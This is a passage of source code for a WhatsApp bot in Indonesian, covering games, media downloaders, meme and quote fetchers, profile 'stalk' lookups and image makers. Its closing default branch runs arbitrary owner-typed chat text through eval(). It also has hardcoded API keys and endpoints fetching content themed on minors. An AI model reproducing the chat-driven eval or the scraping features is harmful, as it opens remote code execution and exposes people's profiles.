zeroyt7.sendMessage(from, tebak, text, {quoted: ftrol})
}, 60000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_10 Detik lagi..._', text) 
}, 50000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_20 Detik lagi..._', text)
}, 40000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_30 Detik lagi..._', text) 
}, 30000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_40 Detik lagi..._', text) 
}, 20000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_50 Detik lagi..._', text) 
}, 10000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_60 Detik lagi..._', text) 
}, 2500) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, ngebuff, image, { caption: '_Tebak bro!!! gak bisa jawab wajib subrek zero yt7 :v_', quoted: ftrol }) 
}, 0) // 1000 = 1s,
break
case 'suit':
if (!q) return reply(`Kirim perintah ${prefix}suit [pilihan]\nContoh: ${prefix}suit gunting`)
if (!q.match(/batu|gunting|kertas/)) return reply(`Format salah!`)
if (q.match(/batu|gunting|kertas/)) {
await sleep(2000)
var computer = Math.random();
if (computer < 0.34) {
computer = 'batu';
} else if (computer >= 0.34 && computer < 0.67) {
computer = 'gunting';
} else {
computer = 'kertas';
}
if (q == computer) {
reply(`*RESULT*\n\nPertandingan Seri!`)
} else if (q == 'batu') {
if (computer == 'gunting') {
reply(`*RESULT*\n\n• You: Batu\n• Computer: Gunting\n\nCongrats You win!`)
} else {
reply(`*RESULT*\n\n• You: Batu\n• Computer: Kertas\n\nYou lose:(`)
}
} else if (q == 'gunting') {
if (computer == 'batu') {
reply(`*RESULT*\n\n• You: Gunting\n• Computer: Batu\n\nYou lose:(`)
} else {
reply(`*RESULT*\n\n• You: Gunting\n• Computer: Kertas\n\nCongrats You win!`)
}
} else if (q == 'kertas') {
if (computer == 'batu') {
reply(`*RESULT*\n\n• You: Kertas\n• Computer: Batu\n\nCongrats You win!`)
} else {
reply(`*RESULT*\n\n• You: Kertas\n• Computer: Gunting\n\nYou lose:(`)
}
}
}
break

//━━━━━━━━━━━━━━━[ FITUR DOWNLOADER ]━━━━━━━━━━━━━━━━━//

case 'play':
gambar = fs.readFileSync('./zeroyt7/zero.jpg')
teks =
`Silahkan Pilih Media Yg Ingin Download`
but = [
          { buttonId: `${prefix}playmp3 ${q}`, buttonText: { displayText: '☰ MUSIC' }, type: 1 },
          { buttonId: `${prefix}playmp4 ${q}`, buttonText: { displayText: '☰ VIDEO' }, type: 1 }
        ]
        sendButLocation(from, teks, faketeks, gambar, but)
break
case 'playmp3':
if (args.length == 0) return await reply(`Judul Lagunya Mana Tod\nContoh : ${prefix + command} melukis senja`)
reply(mess.wait)
await fetchJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${zerokey}&query=${args.join(" ")}`)
.then(async(result) => {
await fetchJson(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${zerokey}&url=https://www.youtube.com/watch?v=${result.result[0].videoId}`)
.then(async(result) => {
result = result.result
caption = `❖ Title    : *${result.title}*\n`
caption += `❖ Size     : *${result.size}*`
ini_buffer = await getBuffer(result.thumbnail)
await zeroyt7.sendMessage(from, ini_buffer, image, { quoted: ftrol, caption: caption })
get_audio = await getBuffer(result.link)
await zeroyt7.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${result.title}.mp3`, quoted: ftrol})
})
})
break
case "playvideo":
if (args.length === 0)
return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
reply(mess.wait)
var srch = args.join("")
aramas = await yts(srch)
aramat = aramas.all;
var mulaikah = aramat[0].url;
try {
ytv(mulaikah).then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res;
axios
.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then(async (a) => {
if (Number(filesize) >= 100000)
return sendMediaURL(from,thumb,`*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
sendMediaURL(from, thumb, captions)
await sendMediaURL(from, dl_link).catch(() => reply("error"))
})
})
} catch (err) {
reply(mess.error.api)
}
break
case 'tiktok':
if (args.length == 0) return reply(`Link Nya Mana Tod\nContoh: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
ini_url = args[0]
ini_url = `https://api.lolhuman.xyz/api/tiktok?apikey=${zerokey}&url=${ini_url}`
get_result = await fetchJson(ini_url)
ini_buffer = await getBuffer(get_result.result.link)
await zeroyt7.sendMessage(from, ini_buffer, video, { quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7'})
break
case 'tiktokmusic':
if (args.length == 0) return reply(`Link Nya Mana Tod\nContoh: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
ini_link = args[0]
get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${zerokey}&url=${ini_link}`)
await zeroyt7.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: ftrol})
break
case 'pinterest':
if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
query = args.join(" ")
ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${zerokey}&query=${query}`)
ini_url = ini_url.result
ini_buffer = await getBuffer(ini_url)
await zeroyt7.sendMessage(from, ini_buffer, image, { quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7'})
break
case 'instagram':
case 'ig':
case 'igdl': 
if (!q) return reply(`Example: ${prefix}igdl link ig`)
if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply('Hmm..')
reply(mess.wait)
anu = await igDownloader (q)
sendMediaURL(from,`${anu.result.link}`,'nih kak')
break
case 'fbdl':
case 'facebook': 
if (!q) return reply(`Example: ${prefix}fbdl link fb`)
reply(mess.wait)
fetchJson(`https://api.lolhuman.xyz/api/facebook?apikey=${zerokey}&url=${args[0]}`).then( res => {
zeroyt7.sendMessage(from, {url: res.result}, video, {quoted: ftrol})
})
break                                 

//━━━━━━━━━━━━━━━[ FITUR ASUPAN ]━━━━━━━━━━━━━━━━━//

case 'asupan':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.result)
zeroyt7.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7', thumbnail: Buffer.alloc(0)})
break
case 'asupancecan':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/cecan?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7', thumbnail: Buffer.alloc(0)})
break
case 'asupanhijaber':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/hijaber?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7', thumbnail: Buffer.alloc(0)})
break
case 'asupansantuy':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/santuy?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7', thumbnail: Buffer.alloc(0)})
break
case 'asupanukhti':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ukty?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7', thumbnail: Buffer.alloc(0)})
break
case 'asupanbocil':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/bocil?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7', thumbnail: Buffer.alloc(0)})
break
case 'asupanghea':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ghea?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7', thumbnail: Buffer.alloc(0)})
break
case 'asupanrika':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/rikagusriani?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7', thumbnail: Buffer.alloc(0)})
break

//━━━━━━━━━━━━━━━[ FITUR RANDOM MEME ]━━━━━━━━━━━━━━━━━//

case 'meme':
await getBuffer(`https://api.lolhuman.xyz/api/random/meme?apikey=${zerokey}`).then((gambar) => {
reply(mess.wait)
zeroyt7.sendMessage(from, gambar, image, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7', thumbnail: Buffer.alloc(0)})
})
break
case 'darkjoke':
await getBuffer(`https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${zerokey}`).then((gambar) => {
reply(mess.wait)
zeroyt7.sendMessage(from, gambar, image, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7', thumbnail: Buffer.alloc(0)})
})
break
case 'memeindo':
await getBuffer(`https://api.lolhuman.xyz/api/meme/memeindo?apikey=${zerokey}`).then((gambar) => {
reply(mess.wait)
zeroyt7.sendMessage(from, gambar, image, {quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7', thumbnail: Buffer.alloc(0)})
})
break

//━━━━━━━━━━━━━━━[ FITUR RANDOM TEXT ]━━━━━━━━━━━━━━━━━//

case 'quotes':
quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotes?apikey=${zerokey}`)
quotes = quotes.result
author = quotes.by
quotes = quotes.quote
reply(`_${quotes}_\n\n*― ${author}*`)
break
case 'quotesanime':
quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${zerokey}`)
quotes = quotes.result
quote = quotes.quote
char = quotes.character
anime = quotes.anime
episode = quotes.episode
reply(`_${quote}_\n\n*― ${char}*\n*― ${anime} ${episode}*`)
break
case 'quotesdilan':
quotedilan = await fetchJson(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${zerokey}`)
reply(quotedilan.result)
break
case 'quotesimage':
get_result = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${zerokey}`)
await zeroyt7.sendMessage(from, get_result, image, { quotes: ftrol })
break
case 'katabijak':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${zerokey}`)
reply(get_result.result)
break
case 'randomnama':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
anu = await fetchJson(`https://api.lolhuman.xyz/api/random/nama?apikey=${zerokey}`)
reply(anu.result)
break

//━━━━━━━━━━━━━━━[ FITUR UPSW ]━━━━━━━━━━━━━━━━━//

case 'upswteks':
if (!isOwner) return reply('LU BUKAN OWNER GBLOK')
if (args.length < 1) return reply('Teksnya?')
teks = body.slice(10)
zeroyt7.sendMessage('status@broadcast', teks, MessageType.text)
reply(`Sukses upload status:\n${teks}`)
break
case 'upswsticker':
if (!isOwner) return reply('LU BUKAN OWNER GBLOK')
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
buff = await zeroyt7.downloadMediaMessage(encmedia)
zeroyt7.sendMessage('status@broadcast', buff, sticker)
}
reply(`Sukses upload sticker`)
break
case 'upswaudio':
if (!isOwner) return reply('LU BUKAN OWNER GBLOK')
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
buff = await zeroyt7.downloadMediaMessage(encmedia)
zeroyt7.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
}
reply(`Sukses upload audio`)
break
case 'upswvideo':
if (!isOwner) return reply('LU BUKAN OWNER GBLOK')
var konti = body.slice(11)
reply(mess.wait)
var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var mediap = await zeroyt7.downloadAndSaveMediaMessage(enmediap)
const buffer3 = fs.readFileSync(mediap)
zeroyt7.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
reply(`Sukses upload video:\n${konti}`)
break
case 'upswimage':
if (!isOwner) return reply('LU BUKAN OWNER GBLOK')
var teksyy = body.slice(11)
reply(mess.wait)
enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await zeroyt7.downloadAndSaveMediaMessage(enmedia)
buffer = fs.readFileSync(media)
zeroyt7.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
reply(`Sukses upload image:\n${teksyy}`)
break

//━━━━━━━━━━━━━━━[ FITUR URL ]━━━━━━━━━━━━━━━━━//

case 'tinyurl':
reply(mess.wait)
if (args.length == 0) return reply(`Format salah! dibutuhkan (${prefix + command} (url with http://)) Example: ${prefix + command} http://panel.vinny.wtf/`)
short = args.join(" ")
ini_result = await fetchJson(`http://hadi-api.herokuapp.com/api/tinyurl?url=${short}`,{method:'get'})
get_result = ini_result.result
ini_txt = `Tinyurl shortlink`
ini_txt += `Shortlink : ${get_result}`
reply (ini_txt)
break
case 'bitly':
reply(mess.wait)
if (args.length == 0) return reply(`Format salah! dibutuhkan (${prefix + command} (url with http://)) Example: ${prefix + command} http://panel.vinny.wtf/`)
short = args.join(" ")
ini_result = await fetchJson(`http://hadi-api.herokuapp.com/api/bitly?url=${short}`,{method:'get'})
get_result = ini_result.result
ini_txt = `bitly shortlink`
ini_txt += `Shortlink : ${get_result}`
reply (ini_txt)
break
case 'shorturl':
 reply(mess.wait)
 if (args.length == 0) return reply(`Format salah! dibutuhkan (${prefix + command} (url with http://)) Example: ${prefix + command} http://panel.vinny.wtf/`)
short = args.join(" ")
ini_result = await fetchJson(`http://hadi-api.herokuapp.com/api/shorturl?url=${short}`,{method:'get'})
get_result = ini_result.result
ini_txt = `shorturl shortlink`
ini_txt += `Shortlink : ${get_result}`
reply (ini_txt)
break
case 'cuttly':
reply(mess.wait)
if (args.length == 0) return reply(`Format salah! dibutuhkan (${prefix + command} (url with http://)) Example: ${prefix + command} http://panel.vinny.wtf/`)
short = args.join(" ")
ini_result = await fetchJson(`http://hadi-api.herokuapp.com/api/cuttly?url=${short}`,{method:'get'})
get_result = ini_result.result
ini_txt = `cuttly shortlink`
ini_txt += `Shortlink : ${get_result}`
reply (ini_txt)
break 

//━━━━━━━━━━━━━━━[ FITUR INFORMATION ]━━━━━━━━━━━━━━━━━//

case 'kbbi':
if (args.length == 0) return reply(`Nama Yg Mau Dicari Mana Tod\nContoh: ${prefix + command} kursi`)
get_result = await fetchJson(`https://api.lolhuman.xyz/api/kbbi?apikey=${zerokey}&query=${args.join(" ")}`)
lila = get_result.result
ini_txt = `\`\`\`Kata : ${lila[0].nama}\`\`\`\n`
ini_txt += `\`\`\`Kata Dasar : ${lila[0].kata_dasar}\`\`\`\n`
ini_txt += `\`\`\`Pelafalan : ${lila[0].pelafalan}\`\`\`\n`
ini_txt += `\`\`\`Bentuk Tidak Baku : ${lila[0].bentuk_tidak_baku}\`\`\`\n\n`
for (var x of lila) {
ini_txt += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
ini_txt += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
ini_txt += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
ini_txt += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
ini_txt += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
}
reply(ini_txt)
break
case 'jarak':
if (args.length == 0) return reply(`Nama Kotanya Mana Tod\nContoh: ${prefix + command} jakarta - yogyakarta`)
pauls = args.join(" ")
teks1 = pauls.split("-")[0].trim()
teks2 = pauls.split("-")[1].trim()
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${zerokey}&kota1=${teks1}&kota2=${teks2}`)
x = get_result.result
ini_txt = `Informasi Jarak dari ${teks1} ke ${teks2} :\n\n`
ini_txt += `\`\`\`◪ Asal :\`\`\` ${x.from.name}\n`
ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.from.latitude}\n`
ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.from.longitude}\n\n`
ini_txt += `\`\`\`◪ Tujuan :\`\`\` ${x.to.name}\n`
ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.to.latitude}\n`
ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.to.longitude}\n\n`
ini_txt += `\`\`\`◪ Jarak Tempuh :\`\`\` ${x.jarak}\n`
ini_txt += `\`\`\`◪ Waktu Tempuh :\`\`\`\n`
ini_txt += `   ╭───────────────❏\n`
ini_txt += `❍┤ Kereta Api : ${x.kereta_api}\n`
ini_txt += `❍┤ Pesawat : ${x.pesawat}\n`
ini_txt += `❍┤ Mobil : ${x.mobil}\n`
ini_txt += `❍┤ Motor : ${x.motor}\n`
ini_txt += `❍┤ Jalan Kaki : ${x.jalan_kaki}\n`
ini_txt += `   ╰───────────────❏\n`
reply(ini_txt)
break
case 'wikipedia':
if (args.length == 0) return reply(`Nama Yg Mau Di Cari Mana Tod\nContoh: ${prefix + command} Tahu`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/wiki?apikey=${zerokey}&query=${query}`)
get_result = get_result.result
reply(get_result)
break
case 'translate':
if (args.length == 0) return reply(`Teks Yg Mau Di Translate Mana Tod\nContoh: ${prefix + command} en Tahu Bacem`)
kode_negara = args[0]
args.shift()
ini_txt = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/translate/auto/${kode_negara}?apikey=${zerokey}&text=${ini_txt}`)
get_result = get_result.result
init_txt = `From : ${get_result.from}\n`
init_txt += `To : ${get_result.to}\n`
init_txt += `Original : ${get_result.original}\n`
init_txt += `Translated : ${get_result.translated}\n`
init_txt += `Pronunciation : ${get_result.pronunciation}\n`
reply(init_txt)
break
case 'jadwaltv':
if (args.length == 0) return reply(`Nama Channel Nya Mana Tod\nContoh: ${prefix + command} SCTV`)
channel = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/${channel}?apikey=${zerokey}`)
get_result = get_result.result
ini_txt = `Jadwal TV ${channel.toUpperCase()}\n`
for (var x in get_result) {
ini_txt += `${x} - ${get_result[x]}\n`
}
reply(ini_txt)
break
case 'infogempa':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=${zerokey}`)
get_result = get_result.result
ini_txt = `Lokasi : ${get_result.lokasi}\n`
ini_txt += `Waktu : ${get_result.waktu}\n`
ini_txt += `Potensi : ${get_result.potensi}\n`
ini_txt += `Magnitude : ${get_result.magnitude}\n`
ini_txt += `Kedalaman : ${get_result.kedalaman}\n`
ini_txt += `Koordinat : ${get_result.koordinat}`
get_buffer = await getBuffer(get_result.map)
await zeroyt7.sendMessage(from, get_buffer, image, { quoted: ftrol, caption: ini_txt })
break
case 'cuaca':
if (args.length == 0) return reply(`Nama Kotanya Mana Tod\nContoh: ${prefix + command} Temanggung`)
daerah = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${daerah}?apikey=${zerokey}`)
get_result = get_result.result
ini_txt = `Tempat : ${get_result.tempat}\n`
ini_txt += `Cuaca : ${get_result.cuaca}\n`
ini_txt += `Angin : ${get_result.angin}\n`
ini_txt += `Description : ${get_result.description}\n`
ini_txt += `Kelembapan : ${get_result.kelembapan}\n`
ini_txt += `Suhu : ${get_result.suhu}\n`
ini_txt += `Udara : ${get_result.udara}\n`
ini_txt += `Permukaan laut : ${get_result.permukaan_laut}\n`
await zeroyt7.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: ftrol })
reply(ini_txt)
break
case 'covidindo':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/indonesia?apikey=${zerokey}`)
get_result = get_result.result
ini_txt = `Positif : ${get_result.positif}\n`
ini_txt += `Sembuh : ${get_result.sembuh}\n`
ini_txt += `Dirawat : ${get_result.dirawat}\n`
ini_txt += `Meninggal : ${get_result.meninggal}`
reply(ini_txt)
break
case 'covidglobal':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=${zerokey}`)
get_result = get_result.result
ini_txt = `Positif : ${get_result.positif}\n`
ini_txt += `Sembuh : ${get_result.sembuh}\n`
ini_txt += `Dirawat : ${get_result.dirawat}\n`
ini_txt += `Meninggal : ${get_result.meninggal}`
reply(ini_txt)
break

//━━━━━━━━━━━━━━━[ FITUR PRIMBON ]━━━━━━━━━━━━━━━━━//

case 'artinama':
if (args.length == 0) return reply(`Namamya Mana Tod\nContoh: ${prefix + command} Zero YT7`)
ini_nama = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/artinama?apikey=${zerokey}&nama=${ini_nama}`)
reply(get_result.result)
break
case 'jodoh':
if (args.length == 0) return reply(`Namanya Mana Tod\nContoh: ${prefix + command} Zero & Sandrinna`)
ini_nama = args.join(" ").split("&")
nama1 = ini_nama[0].trim()
nama2 = ini_nama[1].trim()
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jodoh/${nama1}/${nama2}?apikey=${zerokey}`)
get_result = get_result.result
ini_txt = `Positif : ${get_result.positif}\n`
ini_txt += `Negative : ${get_result.negatif}\n`
ini_txt += `Deskripsi : ${get_result.deskripsi}`
reply(ini_txt)
break
case 'jadian':
if (args.length == 0) return reply(`Tanggal Jadiannya Mana Tod\nContoh: ${prefix + command} 12 12 2020`)
tanggal = args[0]
bulan = args[1]
tahun = args[2]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadian/${tanggal}/${bulan}/${tahun}?apikey=${zerokey}`)
get_result = get_result.result
ini_txt = `Karakteristik : ${get_result.karakteristik}\n`
ini_txt += `Deskripsi : ${get_result.deskripsi}`
reply(ini_txt)
break
case 'tebakumur':
if (args.length == 0) return reply(`Namanya Mana Tod\nContoh: ${prefix + command} Zero YT7`)
ini_name = args.join(" ")
if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebakumur?apikey=${zerokey}&name=${ini_name}`)
get_result = get_result.result
ini_txt = `Nama : ${get_result.name}\n`
ini_txt += `Umur : ${get_result.age}`
reply(ini_txt)
break

//━━━━━━━━━━━━━━━[ FITUR STALK ]━━━━━━━━━━━━━━━━━//

case 'stalkig':
if (args.length == 0) return reply(`Usernamenya Mana Tod\nContoh: ${prefix + command} Sandrinna_11`)
username = args[0]
ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${zerokey}`)
ini_result = ini_result.result
ini_buffer = await getBuffer(ini_result.photo_profile)
ini_txt = `Username : ${ini_result.username}\n`
ini_txt += `Full Name : ${ini_result.fullname}\n`
ini_txt += `Posts : ${ini_result.posts}\n`
ini_txt += `Followers : ${ini_result.followers}\n`
ini_txt += `Following : ${ini_result.following}\n`
ini_txt += `Bio : ${ini_result.bio}`
zeroyt7.sendMessage(from, ini_buffer, image, { caption: ini_txt })
break
case 'stalktiktok':
if (args.length == 0) return reply(`Usernamenya Mana Tod\nContoh: ${prefix + command} Sandrinna`)
stalk_toktok = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/stalktiktok/${stalk_toktok}?apikey=ZeroYT7`)
get_result = get_result.result
ini_txt = `Username : ${get_result.username}\n`
ini_txt += `Nickname : ${get_result.nickname}\n`
ini_txt += `Bio : ${get_result.nickname}\n`
ini_txt += `Followers : ${get_result.followers}\n`
ini_txt += `Followings : ${get_result.followings}\n`
ini_txt += `Likes : ${get_result.likes}\n`
ini_txt += `Video : ${get_result.video}\n`
pp_tt = await getBuffer(get_result.user_picture)
zeroyt7.sendMessage(from, pp_tt, image, { quoted: ftrol, caption: ini_txt })
break
case 'stalkgithub':
if (args.length == 0) return reply(`Usernamenya Mana Tod\nContoh: ${prefix + command} Zero-YT7`)
username = args[0]
ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${zerokey}`)
ini_result = ini_result.result
ini_buffer = await getBuffer(ini_result.avatar)
ini_txt = `Name : ${ini_result.name}\n`
ini_txt += `Link : ${ini_result.url}\n`
ini_txt += `Public Repo : ${ini_result.public_repos}\n`
ini_txt += `Public Gists : ${ini_result.public_gists}\n`
ini_txt += `Followers : ${ini_result.followers}\n`
ini_txt += `Following : ${ini_result.following}\n`
ini_txt += `Bio : ${ini_result.bio}`
zeroyt7.sendMessage(from, ini_buffer, image, { caption: ini_txt })
break

//━━━━━━━━━━━━━━━[ FITUR RANDOM IMAGE ]━━━━━━━━━━━━━━━━━//

case 'loli':
case 'neko':
case 'waifu':
case 'shota':
case 'husbu':
case 'sagiri':
case 'shinobu':
case 'megumin':
case 'wallnime':
getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${zerokey}`).then((gambar) => {
reply(mess.wait)
zeroyt7.sendMessage(from, gambar, image, { quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe Zero YT7'})
})
break

//━━━━━━━━━━━━━━━[ FITUR MAKER ]━━━━━━━━━━━━━━━━━//

case 'tahta':
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('*Teks nya mana?*')
reply(mess.wait)
tahta = args.join(" ")
tahta = await getBuffer(`https://api.zeks.xyz/api/hartatahta?apikey=apivinz&text=${tahta}`)
zeroyt7.sendMessage(from,tahta,image,{quoted:ftrol, thumbnail: Buffer.alloc(0)})
break
case 'thunder':
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('*Teks nya mana?*')
reply(mess.wait)
thunder = args.join(" ")
thunder = await getBuffer(`https://api.zeks.xyz/api/thundertext?apikey=apivinz&text=${thunder}`)
zeroyt7.sendMessage(from,thunder,image,{quoted:ftrol, thumbnail: Buffer.alloc(0)})
break
case 'blackpink':
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('*Teks nya mana?*')
reply(mess.wait)
bp = args.join(" ")
bp = await getBuffer(`https://api.zeks.xyz/api/logobp?apikey=apivinz&text=${bp}`)
zeroyt7.sendMessage(from,bp,image,{quoted:ftrol, thumbnail: Buffer.alloc(0)})
break
case 'glitch':
if (!isGroup) return reply(mess.only.group)
if(!q) return reply(`Example : ${prefix}glitch nama|autor`)
g1 = q.split('|')[0]
g2 = q.split('|')[1]
reply(mess.wait)
glitch = await getBuffer(`https://api.zeks.xyz/api/gtext?apikey=${zeks}&text1=${g1}&text2=${g2}`)
zeroyt7.sendMessage(from,glitch,image,{quoted:ftrol, thumbnail: Buffer.alloc(0)})
break
case 'marvel':
if (!isGroup) return reply(mess.only.group)
if(!q) return reply(`Example : ${prefix}marvel nama|autor`)
m1 = q.split('|')[0]
m2 = q.split('|')[1]
reply(mess.wait)
marvel = await getBuffer(`https://api.zeks.xyz/api/marvellogo?apikey=${zeks}&text1=${m1}&text2=${m2}`)
zeroyt7.sendMessage(from,marvel,image,{quoted:ftrol, thumbnail: Buffer.alloc(0)})
break
default:
if (isOwner) {
			if (budy.startsWith('>')) {
				console.log(color('[EVAL1]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval return`))
				try {
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					reply(`${evaled}`)
				} catch (err) {
					reply(`${err}`)
				}
			} else if (budy.startsWith('x')) {
				console.log(color('[EVAL2]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval identy`))
				try {
					return zeroyt7.sendMessage(from, JSON.stringify(eval(budy.slice(2)), null, '\t'), text, { quoted: ftrol })
				} catch (err) {
					e = String(err)
					reply(e)
				}
			}
		}
		}
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero") && !e.includes("jid")) {
	console.log('Error : %s', color(e, 'red'))
        }
	// console.log(e)
	}
}


	
    
